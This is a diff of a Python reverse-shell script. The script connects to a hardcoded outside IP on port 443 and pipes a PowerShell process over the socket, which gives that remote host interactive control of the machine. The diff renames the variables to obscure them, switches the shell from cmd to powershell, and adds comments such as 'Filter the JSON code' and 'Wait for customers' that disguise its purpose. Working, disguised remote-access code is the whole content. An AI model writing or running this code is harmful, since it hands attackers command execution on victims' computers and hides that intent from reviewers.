@@ -1,29 +1,33 @@
 import os,socket,subprocess,threading;
-def s2p(s, p):
+def s2p(a, b):
     while True:
-        data = s.recv(1024)
+        data = a.recv(1024)
         if len(data) > 0:
-            p.stdin.write(data)
-            p.stdin.flush()
+            b.stdin.write(data)
+            b.stdin.flush()
 
-def p2s(s, p):
+# run the pizza's
+def p2s(a, b):
     while True:
-        s.send(p.stdout.read(1))
+        a.send(b.stdout.read(1))
 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("167.71.4.238",443))
+a=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+a.connect(("167.71.4.238",443))
 
-p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+# Filter the JSON code
+b=subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
-s2p_thread = threading.Thread(target=s2p, args=[s, p])
+# test script
+s2p_thread = threading.Thread(target=s2p, args=[a, b])
 s2p_thread.daemon = True
 s2p_thread.start()
 
-p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread = threading.Thread(target=p2s, args=[a, b])
 p2s_thread.daemon = True
 p2s_thread.start()
 
+# Wait for customers
 try:
-    p.wait()
+    b.wait()
 except KeyboardInterrupt:
-    s.close()
+    a.close()
